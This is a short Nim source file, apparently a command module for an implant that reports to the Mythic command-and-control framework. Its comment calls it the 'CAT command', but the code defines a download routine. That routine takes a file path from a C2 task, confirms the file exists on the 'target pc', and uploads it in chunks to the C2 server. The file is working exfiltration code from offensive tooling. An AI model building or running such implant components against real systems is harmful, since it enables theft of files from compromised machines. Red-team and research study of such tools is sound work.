# This is the source for the CAT command
import ../structs
import ../utils
import ../fileManager
import json
import os

#[
Download a file from the target pc to the C2
  {
    "file": "C:\some\path.txt",
    "host": "target-host"
  }

]#
proc cmd_download*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let targetFile = params["file"].getStr()

  # Configure Output
  var
    output = ""

  # No such file exists
  if not targetFile.fileExists():
    return buildReturnData(task.id, output, "error")

  # receive the absolute path of the file
  let fullPath = absolutePath(targetFile)

  var mythFileId: string
  # Upload it to mythic in chunks
  if not uploadFileToMythic(task.id, fullPath, mythFileId):
    return buildReturnData(task.id, output, "error")

  # return the response
  return buildReturnData(task.id, output)

